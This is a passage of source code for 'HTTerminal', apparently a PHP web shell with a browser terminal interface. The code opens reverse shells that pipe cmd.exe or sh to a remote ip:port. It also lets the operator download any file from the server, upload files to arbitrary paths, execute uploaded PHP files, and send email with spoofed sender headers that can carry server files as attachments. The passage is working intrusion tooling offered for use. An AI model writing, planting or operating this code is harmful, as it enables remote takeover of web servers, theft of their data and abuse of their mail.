                        if(feof($sock)) {//Check stdout pipe is open else tell user socket is closed and exit While loop
                            LogTXT("ERROR: Reverse Shell connection to $ip:$port was terminated\n");
                            break;
                        }else{

                            touch($ClientLastConnectionfile);//Log that client is online
                        }
                    }else{//Read file
                        
                        
                        
                        
                        
                    }
                    
                    
                    if(file_exists($inputfile)) {                     //Pass STDIN
                        $val=file_get_contents($inputfile);
                        fwrite($pipes[0],$val);
                        @unlink($inputfile);
                    }
                    
                    if(!is_null($sock)){//Read socket
                        $dat=fread($sock,$chunk_size);
                        if($dat!=null){file_put_contents($inputfile,trim($dat).PHP_EOL);}
                    }
                    
                    
                    
                    if($size!=filesize($CMD_out)){//Read stdin
                        $section = file_get_contents($CMD_out, FALSE, NULL,$size,(filesize($CMD_out)-$size));
                        $msg=$section;if(!is_null($sock)){fwrite($sock,$msg);}else{LogTXT($msg);}
                    }
                    $size=filesize($CMD_out);
                    
                    
                    
                    if($size2!=filesize($CMD_err)){//Read stderr
                        $section = file_get_contents($CMD_err, FALSE, NULL,$size2,(filesize($CMD_err)-$size2));
                        $msg=$section;if(!is_null($sock)){fwrite($sock,$msg);}else{LogTXT($msg);}
                    }
                    $size2=filesize($CMD_err);
                    
                    
                    
                }
                fclose($pipes[0]);//Close pipes,socket,process
                KillProcess($pid);
                KillProcess($ppid);
                proc_close($process);
                
                if(!is_null($sock)){//If socket is created,close it
                    fclose($sock);
                    LogTXT("Reverse Shell connection to $ip:$port closed\n");
                }
                
                
                if(file_exists($CMD_out)){@unlink($CMD_out);}
                if(file_exists($CMD_err)){@unlink($CMD_err);}
                
                
                
            }else{//$process is not resource ==> failed to open cmd.exe
                $msg="Error: Failed To access cmd.exe.\n";if(!is_null($sock)){fwrite($sock,$msg);}else{LogTXT($msg);}//Message User if opening cmd.exe failed
                die();
            }
            
    }//End of cmd.exe handling codes
    
    
}


$Error_messages ="";
function ErrorHandler($errno, $errstr, $errfile, $errline) {//Function handling errors
    global $Error_messages;
    global $Error_num;
	global $debug;
    $Error_num+=1;
	if(strlen($Error_messages)>1024){//avoid $Error_messages Overflow!
		$Error_messages="";
	}
    $Error_messages.="Error $Error_num:$errstr;";
	if($debug){
	file_put_contents('logs.txt', "Error $Error_num:$errstr;Line $errline".PHP_EOL , FILE_APPEND);
	}
}





function DownloadFile(){//Download files from server to browser
    //Set current directory from ccd file;
	global $CCD_file;
	if(file_exists($CCD_file)){chdir(trim(file_get_contents($CCD_file)));}
	
    if(!isset($_POST['d'])){
        $file="";
    }else{
        $file=$_POST['d'];
    }
    
    $type=@mime_content_type($file);
    header("Content-disposition: ".$type.";filename=".basename($file));
    header("Content-Type: ".$type."; charset=UTF-8");
    readfile($file);
    
    global $Error_messages;//Error_handler
    if($Error_messages!=""){
        header("Content-Type: text/error; charset=UTF-8");
        die($Error_messages);
    }
}


function pexec(){//Execute uploaded php file
    //Set current directory from ccd file;
	global $CCD_file;
	if(file_exists($CCD_file)){chdir(trim(file_get_contents($CCD_file)));}
	
    @include($_FILES["file"]["tmp_name"]);
}



function Upload(){//Upload files on server
    
    //Set current directory from ccd file;
	global $CCD_file;
	if(file_exists($CCD_file)){chdir(trim(file_get_contents($CCD_file)));}
	
	$upload_dir = '.'.DIRECTORY_SEPARATOR;
	
    if(isset($_POST['p']) && $_POST['p']!=""){
        
        $upload_dir=$_POST['p'];
        if(substr($upload_dir, -1)!=DIRECTORY_SEPARATOR){
            $upload_dir.=DIRECTORY_SEPARATOR;
        }
        
    }
    
    $target=$upload_dir.basename($_FILES['file']['name']);
    
    if(@!move_uploaded_file($_FILES['file']['tmp_name'],$target)) {
        
        header("Content-Type: text/error; charset=UTF-8");
        global $Error_messages;
        die($Error_messages);
        
        
    }
    
    
}



function generateRandomString($length) {//Generate random string
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}


function SendMail(){//Send email

    //Set current directory from ccd file;
	global $CCD_file;
	if(file_exists($CCD_file)){chdir(trim(file_get_contents($CCD_file)));}

    ini_set('mail.add_x_header', 0);//Prevent leaking php filename and path if it is possible
    
    if(isset($_POST['from']) && $_POST['from']!=""){
        $from=$_POST['from'];
    }
    
    if(isset($_POST['to']) && $_POST['to']!=""){
        $to=$_POST['to'];
    }
    
    $subject="";
    if(isset($_POST['subject']) && $_POST['subject']!=""){
        $subject=$_POST['subject'];
    }
    
    $messagefile=$_POST['messagefile'];
    $message=file_get_contents($messagefile);
    $messagetype=mime_content_type($messagefile);
    
    $headers= "MIME-Version: 1.0\r\n";
    $headers.="From: $from\r\n";
    
    
    
    $replyto=$from;
    if(isset($_POST['replyto']) && $_POST['replyto']!=""){
        $replyto=$_POST['replyto'];
        
    }
    $headers.="Reply-To: $replyto\r\n";
    
    
    
    if(isset($_POST['cc'])){
        $cc=$_POST['cc'];
        $cc=explode(",",$cc);
        $cc=array_filter($cc);
        $cc=implode(", ",$cc);
        
        $headers .= "Cc: $cc\r\n";
    }
    
    if(isset($_POST['bcc'])){
        $bcc=$_POST['bcc'];
        $bcc=explode(",",$bcc);
        $bcc=array_filter($bcc);
        $bcc=implode(", ",$bcc);
        $headers .= "Bcc: $bcc\r\n";
    }
    
    $boundary = md5(generateRandomString(5));
    $headers .= "Content-Type: multipart/mixed; boundary = $boundary\r\n\r\n";
    
    //plain text
    $body= "--$boundary\r\n";
    $body.= "Content-Type: text/html; charset=ISO-8859-1\r\n";
    $body.= "Content-Transfer-Encoding: base64\r\n\r\n";
    $body.= chunk_split(base64_encode($message));
    
    if(isset($_POST['attachmentfile']) && $_POST['attachmentfile']!=""){
        $file=$_POST['attachmentfile'];
        
        $encoded_content = chunk_split(base64_encode(file_get_contents($file)));
        
        $file_name=basename($file);
        $file_type=mime_content_type($file);
        $body.= "--$boundary\r\n";
        $body.="Content-Type: $file_type; name=".$file_name."\r\n";
        $body.="Content-Disposition: attachment; filename=".$file_name."\r\n";
        $body.="Content-Transfer-Encoding: base64\r\n";
        $body.="X-Attachment-Id: ".rand(1000,99999)."\r\n\r\n";
        $body.= $encoded_content;
    }
    mail($to, $subject,$body, $headers);
    
    global $Error_messages;
    if($Error_messages!=""){
        header("Content-Type: text/error; charset=UTF-8");
        die($Error_messages);
    }
    
}


function StartSession(){//Start session

	global $inputfile;
	global $outputfile;
	global $timerfile;
	global $pidfile;
	global $SIGKILLfile;
	global $ClientLastConnectionfile;
	global $Shell_Mode_file;
	global $Shell_Mode;
	global $CCD_file; 
	global $Welcome_message;
	global $OS_Version;
	global $User;
	global $OS;
	global $CMD_out;
	global $CMD_err;
	$Welcome_message="\nOperation System:$OS_Version\nUser:$User\n\n";
	
	$inputfile=".in.".HashMD5("anti-lfi");//File to store stdin input
    $outputfile=".out.".HashMD5("anti-lfi");//File to store process and script output
    $timerfile=".timer.".HashMD5("anti-lfi");//File to store the last date process was active
    $pidfile=".pid.".HashMD5("anti-lfi");//File to store pid of created process
    $SIGKILLfile=".SIGKILL.".HashMD5("anti-lfi");//file to ask killing process by creating it
    $ClientLastConnectionfile=".CLast.".HashMD5("anti-lfi");//File to store last date client visited the page
    $Shell_Mode_file=".mode.".HashMD5("anti-lfi");//File to save shell mode,Use proc_open for run-time shell or use SysExec for just executing commands
    $Shell_Mode='';
    $CCD_file='.ccd.'.HashMD5("anti-lfi");//File to save current directory choosen for shell mode

	//------------
	//Files to hanld CMD.exe stout and stderr on Windows
	if($OS=='windows'){
	  $CMD_out="results.".HashMD5("anti-lfi");
	  $CMD_err="error.".HashMD5("anti-lfi");		
	}
   //------------

    if(file_exists($outputfile)){@unlink($outputfile);}
	if(file_exists($inputfile)){@unlink($inputfile);}
	
	
    //Get current directory from ccd file;
	if(file_exists($CCD_file)){$dir=(trim(file_get_contents($CCD_file)));}else{$dir=getcwd();}	
	
	
    $_SESSION['loggedIn']=1;//we change 1 to 2 after sending hello message in CheckCSRF_Token() function
    $token=generateRandomString(25);//Geneate string with 25 random characters,use as csrf token.token is created by login and destroyed by logout
    $_SESSION['CSRF_TOKEN']=$token;
	header("CSRF_TOKEN: ".$token);
    SetDefaultShellMode(false);
    $msg=$Welcome_message."Current Working directory:$dir\nThis PHP file path:".__FILE__."\n\n\n";
    
	
	

	if($Shell_Mode!="proc_open"){
        $msg.="Warning:Shell mode is command_only.\nYou can't get run-time outputs or read stderr\nJust send your command to execute them\nor use command \"rv\" to get a reverse shell\n\n";
    }
    Logtxt($msg);
	TestShell();
    SetDefaultShellMode(true);
}


function CheckCSRF_Token(){
    




    
    if(!isset($_POST['token'])){//Token not sent
        LogTXT("You are under CSRF attack!\n");
        die();
        
    }else{
        
        $Sent_token=$_POST['token'];
        if($_SESSION['CSRF_TOKEN']!=$Sent_token){

			if($Sent_token!=""){//An invalid token is sent!
				//Someone trying fake tokens,die and don't continue.it's an attack!
				die();
		    }else{//User may loose CSRF_TOKEN by closing tab(not logging out) so we tell him what token is again!	
			    header("CSRF_TOKEN: ".$_SESSION['CSRF_TOKEN']);
			}
            
			
        }
        
    }
    
}


function IsSessionExistsAndIsValid(){//Check session is valid or not

    // start session if session is not already started
    if (session_status() !== PHP_SESSION_ACTIVE)
    {
        session_start();
    }
    
    if(!isset($_SESSION['loggedIn'])){
        return false;
    }
	
	global $inputfile;
	global $outputfile;
	global $timerfile;
	global $pidfile;
	global $SIGKILLfile;
	global $ClientLastConnectionfile;
	global $Shell_Mode_file;
	global $Shell_Mode;
	global $CCD_file; 
	global $Welcome_message;
	global $OS_Version;
	global $User;
	global $CMD_out;
	global $CMD_err;
	global $OS;
	$Welcome_message="\nOperation System:$OS_Version\nUser:$User\n\n";
	
	$inputfile=".in.".HashMD5("anti-lfi");//File to store stdin input
    $outputfile=".out.".HashMD5("anti-lfi");//File to store process and script output
    $timerfile=".timer.".HashMD5("anti-lfi");//File to store the last date process was active
    $pidfile=".pid.".HashMD5("anti-lfi");//File to store pid of created process
    $SIGKILLfile=".SIGKILL.".HashMD5("anti-lfi");//file to ask killing process by creating it
    $ClientLastConnectionfile=".CLast.".HashMD5("anti-lfi");//File to store last date client visited the page
    $Shell_Mode_file=".mode.".HashMD5("anti-lfi");//File to save shell mode,Use proc_open for run-time shell or use SysExec for just executing commands
    $Shell_Mode='';
    $CCD_file='.ccd.'.HashMD5("anti-lfi");//File to save current directory choosen for shell mode
	
	//------------
	//Files to hanld CMD.exe stout and stderr on Windows
	if($OS=='windows'){
	  $CMD_out="results.".HashMD5("anti-lfi");
	  $CMD_err="error.".HashMD5("anti-lfi");		
	}
   //------------



	
    return true;
    
}

function HashMD5($txt){
	global $salt;
	$hash=md5($txt.$salt);
	return $hash;
	
}

function HashSHA256($txt){//Generate SHA256 hashes
    global $salt;
    $hash=hash('sha256', $txt.$salt);
    return $hash;
}


function SavePasswordHash($password){//Save passwords
    if(IsSessionExistsAndIsValid()){
        global $Passwordfile;
        file_put_contents($Passwordfile,HashSHA256($password));
    }
}

function LoadPasswordHash(){//Load hash from file
    global $Passwordfile;
    if(!file_exists($Passwordfile)){
        return false;//No password is set yet
    }else{
        return file_get_contents($Passwordfile);
    }
}







function Logout(){//Logout
    global $ClientLastConnectionfile;
    if(IsSessionExistsAndIsValid()){
        session_destroy();
        session_unset();
        session_write_close();
        
        touch($ClientLastConnectionfile,100);//set client last visit file date to the past and make shell process to exit

        $txt="LoggedOut";
        die($txt);
    }else{
        header("Content-Type: text/error; charset=UTF-8");
        die("Login");
    }
}






function Login(){//Login
    if(IsSessionExistsAndIsValid()){//Session Is set and no problem.check password is set or Not...
        CheckCSRF_Token();
        if(isset($_POST['pass']) && isset($_POST['setpass'])){//If logged in and password isset and login= is not set means user wants password chang
            $pass=$_POST['pass'];
            if($pass!=""){
                SavePasswordHash($pass);
                $txt="NewPasswordSet";
                die($txt);
            }else{
                $txt="PasswordMustNotBeEmpty";
                header("Content-Type: text/error; charset=UTF-8");
                die($txt);
            }
        }
        
        if(!LoadPasswordHash()){//First Login.Set a password
            $txt="SetPassword";
            header("Content-Type: text/error; charset=UTF-8");
            die($txt);
        }
        
        //Session is Ok and Password is set.Logged in successfully:
        
        
    }else{//Not Valid session.Check password is set or not.if is not give session else ask password to login
        if(!LoadPasswordHash()){
            StartSession();
            return;
        }//Password is set and must be verified
        
        if(isset($_POST['pass'])){
            $pass=$_POST['pass'];
            if(HashSHA256($pass)==LoadPasswordHash()){
                StartSession();
            }else{
                header("Content-Type: text/error; charset=UTF-8");
                die("WrongPassword");//Password is wrong
            }
        }else{
            header("Content-Type: text/error; charset=UTF-8");
            die("PasswordParameterNeeded");//Password is not sent
        }
    }
}





function PreStartShell(){//Prepare variables to call StartShell() function
    
    $address='';
    $port='';
    $mode='';
    if($_POST['s']!="local"){
        
        
        
        $address=$_POST['s'];
        
        if(isset($_POST['p'])){
            $port=$_POST['p'];
        }
        
        $mode="socket";
        
        
        if(isset($_POST['ssl'])){
            $mode="ssl";
        }
        $command="php ".__FILE__." $mode $address $port  >/dev/null &";
        
        
    }else{
        $mode="local";
        $command="php ".__FILE__." $mode  >/dev/null &";
        
    }
    /*
     We can get php executable path on unix/Linux/Mac so we can use system function to run this script from CLI,
     (We run the shell handler from CLI to be more lucky to daemonise the script)
     But on Windows it's hard to get php.exe and daemonise the script so we call the function StartShell() directly;
     
     */
    SetDefaultShellMode(false);
    global $Shell_Mode;
    
    if($Shell_Mode=="proc_open"){//If proc_open available call StartShell()
        
        if($OS=="unix-linux-mac"){//Execute command on non-Windows operation systems
            set_time_limit(0);
            SysExec($command,false);
            
        }else{//On Windows,We Close the HTTP connection then call StartShell()
            StartShell($mode,$address,$port);
        }
        
    }else{//if mode is local warn user that we don't need for "start" command,if asking for reverse shell do it
        
        if($mode=="local"){
            LogTXT("Warning:Shell mode is command_only.\nYou can't get run-time outputs or read stderr\nJust send your command to execute them\nor use command \"rv\" to get a reverse shell\n\n");
        }else{//user asked reverse shell...
            StartShell($mode,$address,$port);
        }
        
    }
    
    
    die();
    
    
    
}

set_error_handler("ErrorHandler");//set ErrorHandler() function to handle errors

if (PHP_SAPI!='cli'){//Script is running from Web Server
    header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");//Prevent caching
    header("Cache-Control: post-check=0, pre-check=0", false);
    header("Pragma: no-cache");
}else{//Script is running from CLI
    
    
    $mode=$argv[1];                //Start shell
    if($argv[2]){$address=$argv[2];}
    if($argv[3]){$port=$argv[3];}
    
    if(file_exists($inputfile)){unlink($inputfile);}
    StartShell($mode,$address,$port);
    die();
    
}



if(isset($_POST['s'])){//Local shell/Or reverse shell
   Login();
   session_write_close();
   PreStartShell();

   die();
}elseif(isset($_POST['r'])){//Read ouptuts
    Login();

    session_write_close();
    ReadTXT();
    if(file_exists($outputfile)){@unlink($outputfile);}
    
    die();
}elseif(isset($_POST['c'])){//recieve command inputs
    Login();

    session_write_close();
    SendSTDIN();

    die();
}elseif(isset($_POST['k'])){//send killing signal to running cmd.exe/sh process
    Login();

    session_write_close();
    SendSIGKILL();

    die();
}elseif(isset($_POST['d'])){//download file to browser
    Login();

    session_write_close();
    DownloadFile();
    die();
}elseif(isset($_POST['p'])){//upload file to server
    Login();

    session_write_close();
    Upload();

    die();
}elseif(isset($_POST['from'])){//send email
    Login();

    session_write_close();
    SendMail();
    die();

}elseif(isset($_FILES['file'])){//Upload and execute a php file,delete it
    Login();

    session_write_close();
    pexec();
    die();


}elseif(isset($_POST['l'])){//Logout
    Login();

    Logout();
    @session_write_close();
    die();
}elseif(isset($_POST['cm'])){//change shell mode(proc_open/command_only)
    Login();

    session_write_close();
    ChangeShellMode();
    die();
}elseif(isset($_POST['ccd'])){//change current directly settings for functions like download,upload,shell,sendmail 
    Login();

    session_write_close();
    $output=CCD($_POST['ccd']);
	if($output!=""){LogTXT($output);}
    die();
}elseif(isset($_POST['cwd'])){//get current directory for functions like download,upload,shell,sendmail 
    Login();

    session_write_close();
    $output=cwd();
	if($output!=""){LogTXT($output);}
    die();
}







?>
<!DOCTYPE html>
<html>
<head>
<title>HTTerminal</title>
<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
<meta http-equiv="Pragma" content="no-cache" />
<meta http-equiv="Expires" content="0" />
</head>

<style>

.terminal{
position: absolute;
left: 1%;
top: 1%;
width:98%;
height:80%;
color: white;
background-color: black;
overflow-x: hidden;
overflow-y: scroll;
font-size:10vw;
}

.buttons{
position: absolute;
/*
width:14.5vw;
*/
height:10%;
box-shadow: 1px 5px 1px gray;
font-family: courier,fixed,swiss,monospace,sans-serif;

/*
font-size:4vh;
font-weight:15vw;
*/

font-size:calc(4.5vh*(100vw/100vh));
font-weight:calc(14.5vw*(100vw/100vh));

background-color:#158eef;
color:#ffffff;
text-align:center;

min-width:14.5%;



/*round button corners*/
border-radius:20%;


}

/*prevent dotted box after button clicking*/
button::-moz-focus-inner { border: 0; }


.inptxt{
position: absolute;
left: 1%;
top: 82%;

width:65%;
height:10%;
font-family: courier,fixed,swiss,monospace,sans-serif;
font-size:5vh;
font-weight:15vw;

background-color:Black;
color:white;

box-shadow: 1px 1px 1px gray;


resize:none;

white-space: pre;
overflow: auto;
}

.sendButton{
width:14.5%;
height:10%;
left: 66.5%;
top: 82%;
background-color:green;
color:white;
}

.UpBtn{
top: 82%;
left: 82%;

min-width:7.25%;
height:5%;
}

.DownBtn{
top: 87%;
left: 82%;

min-width:7.25%;
height:5vh;
}



.uploadButton{

background-color:red;
color:white;


position:absolute
box-shadow: 1px 0.5px 1px gray;


min-width:7.25vw;
top: 73vh;

left:11.5vw;
}




.FileInput{

opacity:0;
position:absolute;
z-index:-1;

}

.BrowseLabel{
position:absolute;
cursor: pointer;
background-color:#e9b96e;
color:black;
text-align:center;

top: 85.5%;
left: 91.75%;


font-family: courier,fixed,swiss,monospace,sans-serif;
font-size:2vh;
font-weight:6vw;

width:7%;


display: block;
white-space: nowrap;
text-overflow: ellipsis;
overflow: hidden;
}

.Downloadtxt{
top: 73vh;
width:21.66vw;

left:26.5vw;
}

</style>
<script type="text/javascript">


var Version=1;
var ProjectPage="https://github.com/0xCoderMan/HTTerminal";
var DonationAddress="1MS34ogcsPj3mSrNJfutUrR1yxC9XTxiyf"

var DonationLink="https://www.blockchain.com/btc/payment_request?address="+DonationAddress+"&message=Thanks for your donation.";
















String.prototype.CrossBrowserstartsWith=function(str){
return (this.indexOf(str)==0);
};


String.prototype.CrossBrowserendsWith=function(str){
return (this.lastIndexOf(str)==this.length-str.length)
};


String.prototype.replaceAll = function(search, replacement) {
    var target = this;
    return target.split(search).join(replacement);
};




String.prototype.trimStartAndEnd =function() {
    var str=this
    str = str.replace(/^\s+/, '');
    for (var i = str.length - 1; i >= 0; i--) {
        if (/\S/.test(str.charAt(i))) {
            str = str.substring(0, i + 1);
            break;
        }
    }
    return str;
}

var HIST;//History Loaded from local storage.This will be used to read from local storage or write to it

var HIST2=[""];//History list containing what is going on run-time period.
//What HIST2 Array looks like: ["WhatIsInTextBoxNow",TheOldsetCommandInHistory,...,TheNewestCommandInHistory]

var HIST_index=0;//HIST_index contains the index of item loaded from HIST2 array to input textbox.We use it to access items from history list HIST2

var TXTCOLOR;//This contains the current color of terminal text color

var BGCOLOR;//This contains the current color of terminal background color

var TXTSIZE;//This contains the size of terminal text

var LocalStorageSupported=false;//Is Local Storage supported or not.Will be changed to "true" if it is supported


var lastoutput="";//Contains last result update from terminal

var ServerCommands=""//Contains commands will be sent to the server

var AutoScroll=true;//Auto scroll terminal if new result is available(value controlled by "src" command)

var AutoUpdate=true//Update results from server automatically or not?

var SaveCommandsToLocalStorage="y"; //Save commands to local storage or not if it is supported?


if(typeof Storage!==void(0)){//Local Storage is supported.Extract settings and History saved on browser
	LocalStorageSupported=true;

	BGCOLOR=localStorage.getItem("BGCOLOR");//terminal backgroundcolor saved to local storage
	TXTCOLOR=localStorage.getItem("TXTCOLOR");//terminal textcolor saved to local storage
    TXTSIZE=localStorage.getItem("TXTSIZE");//terminal text size saved to local storage
	SaveCommandsToLocalStorage=localStorage.getItem("LOCALHIST");
	
	HIST=JSON.parse(localStorage.getItem("HIST"));//extract history saved from local storage to HIST.History is saved in JSON format on local storage so decode JSON format
	
	
	if(!BGCOLOR){BGCOLOR="black";}//If Nothing is saved for color settings and history in local storage,use default colors and empty history
	if(!TXTCOLOR){TXTCOLOR="white";}
	if(!TXTSIZE){TXTSIZE="5vh";}
	if(!HIST){HIST=[];}
	
	if(SaveCommandsToLocalStorage!="y" && SaveCommandsToLocalStorage!="n"){SaveCommandsToLocalStorage="y";}
	
	Array.prototype.push.apply(HIST2,HIST);//Copy Histroy loaded from local storage to History list

}else{//Local Storage not supported.History and settings will not be saved on the browser.Use default settings...

	BGCOLOR="black"//Default colors for terminal:Black background and white text
	TXTCOLOR="white"
	TXTSIZE="5vh";
}


function SaveSettingsAndHist(LocalItem,value){//Function to Save history and settings if local storage is supported else do nothing
	if(LocalStorageSupported){
		if(LocalItem=="HIST"){//If want to save history.encode it into JSON format	
			
			if(SaveCommandsToLocalStorage=="y"){
				value=JSON.stringify(value);
			}else if(value!=[]){//for clearhist command
				return;//Don't save commands to local storage
			}
	
		}
		localStorage.setItem(LocalItem,value);
	}
}

var ServerOuts='';
function clientLogTXT(txt){//Function to print to htterminal console screens

	document.getElementById("terminal").contentWindow.document.getElementById("output").innerHTML+=ServerOuts+txt;
	
}



function PrepareTerminalIframe(){//Function to convert iframe to terminal
	/*
	Html codes of terminal iframe
	div "terminal_back" contains terminal body
	label "input" contains what input textbox "inptxt" contains
	label "cursor" contains Cursor and will blink by BlinkCursor() function
	label "output" contains commands output (result of local commands or result of commands executed on server)
	*/
	var IframeHTML="\
		<html>\
		<style>\
		.bgstyle {\
		color:"+TXTCOLOR+";\
		background-color: "+BGCOLOR+";\
		font-family: courier,fixed,swiss,monospace,sans-serif;\
		font-size:"+TXTSIZE+";\
		font-weight:15vw;\
		opacity: 0.9;\
		}\
		</style>\
		<body style=\"\" oncopy=\"window.parent.document.getElementById(\'inptxt\').focus();\" onkeypress=\"var k=event.key;if(k.length==1){window.parent.document.getElementById(\'inptxt\').value+=k};window.parent.document.getElementById(\'inptxt\').focus();\">\
		<div width=\"100%\" height=\"100%\" class=\"bgstyle\" id=\'terminal_back\'>\
		<label id=\'output\'></label><label id=\'input\'></label><label id=\'cursor\' style=\'background-color: "+TXTCOLOR+";\'>&nbsp;</label>\
		</div>\
		</body>\
		</html>\
		";
	//open iframe document,write Iframe html codes to it,close it
	document.getElementById("terminal").contentWindow.document.open();
	document.getElementById("terminal").contentWindow.document.write(IframeHTML);
	document.getElementById("terminal").contentWindow.document.close();

}








function CheckHTTPS(){//Function to check address is HTTPS or not,warn user if isn't
	if(!document.URL.CrossBrowserstartsWith("https")){//address isn't HTTPS and warn user about it
		var Warning="Warning:use HTTPS protocol to protect your terminal from sniffing attacks!<br><br>"
		clientLogTXT(Warning)
	}
}




function main(){//Function to load settings and call neccessarry function after body was loaded
	PrepareTerminalIframe()//Convert iframe to terminal
	SetColors(BGCOLOR,TXTCOLOR)//Set created terminal text and background color to loaded colors from local storage or default colors
	SetFontSize(TXTSIZE)//Set created terminal text size  to loaded size from local storage or default colors
	ShowHelp()//print Help message to terminal
	CheckHTTPS()//Check address is HTTPS and if isn't warn user about it's dangers

        window.setInterval("BlinkCursor()", 600);//Blink cursor every 600 miliseconds
        window.setInterval("ScrollDownByOutPutUpdating()", 200);//Check and Scroll down iframe every 200 miliseconds
        window.setInterval("Updator()", 3000);//Update terminal every 3000 miliseconds
        document.getElementById('inptxt').focus()//Focus textbox
        
}





function BlinkCursor(){//Function to blick cursor of teminal,we call this function every n miliseconds
	if(document.activeElement!=document.getElementById("inptxt")){//If textbox is not focused,don't blink
		document.getElementById("terminal").contentWindow.document.getElementById("cursor").style.backgroundColor=BGCOLOR;
		return;
	}

	//Blink cursor by changing it color to background/text color of terminal
	var col=document.getElementById("terminal").contentWindow.document.getElementById("cursor").style.backgroundColor
	if(col==TXTCOLOR){
		document.getElementById("terminal").contentWindow.document.getElementById("cursor").style.backgroundColor=BGCOLOR;
	}else{
		document.getElementById("terminal").contentWindow.document.getElementById("cursor").style.backgroundColor=TXTCOLOR;
	}
}






function ScrollDownByOutPutUpdating(){//This functions Scrolls down terminal iframe as it be updated,be called every n miliseconds
	var TextInOutPutLabel=document.getElementById("terminal").contentWindow.document.getElementById("output").innerText
	if(lastoutput!=TextInOutPutLabel){//terminal output is difference of what is comming,means terminal's text is updated and should scroll down the iframe
		if(AutoScroll){
		     document.getElementById("terminal").contentWindow.scrollTo(0,999999);//Scroll down iframe
		     lastoutput=TextInOutPutLabel
		}
	}
}




function inptxtchange(value){
	if(AutoScroll){
	document.getElementById("terminal").contentWindow.scrollTo(0,999999);//Scroll down terminal iframe on textbox text change
    }
	var LinesArray=value.split("\n");//Convert textbox input to an array by splitting newline,Newline at the end of line is similar to pressing Enter at Linux terminal.
	var size=LinesArray.length//Get size of lines array
        var NewValueForTextbox=''
	if(1<size){//Lines array size is more than 1,it means we have at least one line ending with Newline and it's time to execute command(s)



/*
There are two kinds of commands:
1-Custom commands:
Commands that are defined by the programmer of this project(Me ^_^) to perform some usefull acts as setting terminal colors,showing history saved is local storage,uploading files,...

2-OS shell commands:
Commands that be sent to the server to execute and their result be printed in the terminal,For linux they are bash commands.examples:ls -a,whoami,...

We Check all commands entered by the user for Custom or OS shell commands,Execute Custom commands by Javascript or PHP then send OS shell commands to server and wait to get their result
*/

		if(LinesArray[size-1]==""){//All Lines ending with newline.Execute All lines and add them to history

			LinesArray.splice(-1,1);//The last item of line1\nline2\n....lineN\n lines array is null,remove it from array
			for (var n in LinesArray) {//For every Line in the lines array...
                                 //Check if line is not empty and is not depublicate then add it to history list
/*				 if(LinesArray[n].trim()!="" && HIST[HIST.length-1]!=LinesArray[n]){
					  HIST.push(encodeHTML(LinesArray[n]))
				 }
*/
				 CheckCommand(LinesArray[n])//Send command to check is it Custom if not then send it to server
			}


		}else{//The Last Line not ending with Newline.Execute all lines and add them to history except the last line.keep the last line in the textbox



if(document.getElementById('inptxt').selectionStart==document.getElementById('inptxt').value.length){

			var theLastLine=LinesArray[size-1];//Get value of the last line
			NewValueForTextbox=theLastLine//Keep the last line text in textbox
			LinesArray.splice(-1,1);//Delete the last line from array.The last line not being executed


			for (var n in LinesArray) {//For every Line in the lines array...
                                 //Check if line is not empty and is not depublicate then add it to history list
/*				 if(LinesArray[n].trim()!="" && HIST[HIST.length-1]!=LinesArray[n]){
					  HIST.push(encodeHTML(LinesArray[n]))
				 }
*/
			     CheckCommand(LinesArray[n])//Send command to check is it Custom if not then send it to server
			}


}else{

LinesArray=LinesArray.join("")
CheckCommand(LinesArray)
}


		}

		/*
		After Executing Commands:
		Update History
		Make Run-time History empty and then append the real history (HIST) to it
		Save the real history (HIST) to local storage if it is supported
		Set Current History index to 0
		*/
		HIST2=[""];
		Array.prototype.push.apply(HIST2,HIST);
		SaveSettingsAndHist("HIST", HIST);//Update Local Storage History if is supported
		HIST_index=0;
		document.getElementById("inptxt").value=NewValueForTextbox;//Set textbox new value as commands are recieved and are going to be checked




	}//else{// size<=1 means No Newline character found in the string so just nothing to do.We have no commands to execute

	//Update terminal "input" to what is in textbox now
	 UpdateInputLabelByTextbox()
}


function UpdateInputLabelByTextbox(){
document.getElementById("terminal").contentWindow.document.getElementById("input").innerHTML=encodeHTML(document.getElementById("inptxt").value);
}




function DownLoadTextToFile(filename,type,data) {//Function to download data as a file locally
	var blob = new Blob([data],{type:type});//Create a blob,content-type is type(ex. text/plain,text/html,...),pass data to it


    if (window.navigator && window.navigator.msSaveOrOpenBlob) {//On Microsoft browsers_IE & Edge
          window.navigator.msSaveOrOpenBlob(blob, filename);
    } else {//On other browsers
	      var link = document.createElement('a');//Create a link in document
	      link.href = window.URL.createObjectURL(blob);//pass blob values to link
	      link.download = filename;//set filename
	      document.body.appendChild(link);//append link to document's body
	      link.click();//Click the created link to download file
	      document.body.removeChild(link);//Detete created link after clicking it
	
    }

}




function getFileNameByContentDisposition(contentDisposition){//Function to extract filename from content-Disposition HTTP response header.server set's it while asking to download a file

    /*
    What Content-Disposition header looks like:Content-Disposition: attachment; filename="filename.jpg"
    Using regex to extract filename from header
    */
	var regex = /filename[^;=\n]*=(UTF-8(['"]*))?(.*)/;
	var matches = regex.exec(contentDisposition);
	var filename;

	if (matches != null && matches[3]) { 
	      filename = matches[3].replace(/['"]/g, '');
	}

	    return decodeURI(filename);//Decode URL encoded filename extracted and return it
}




function CheckIsPasswordStrong(password){//Function To check password is strong
	var passwordStrongRegex =new RegExp("^(((?=.*[a-z])(?=.*[A-Z]))|((?=.*[a-z])(?=.*[0-9]))|((?=.*[A-Z])(?=.*[0-9])))(?=.{6,})");//regex for Strong passwords,contain one upper character,one lower character,one numeric character and be at least 6 characters

	if(!passwordStrongRegex.test(password)){//If password is weak,Warn user about it
		clientLogTXT("Warning:Your password is weak.It should contain one upper character,one lower character,one numeric character and be at least 6 characters<br>")
	}else{
		clientLogTXT("Your password is strong<br>")//If password is strong,print this to terminal
	}

}


function encodeHTML(s) {
/*
prevent xss
https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet#RULE_.231_-_HTML_Escape_Before_Inserting_Untrusted_Data_into_HTML_Element_Content

& --> &amp;
< --> &lt;
> --> &gt;
" --> &quot;
' --> &#x27;
/ --> &#x2F;
space --> &nbsp;
\n --> <br>
*/

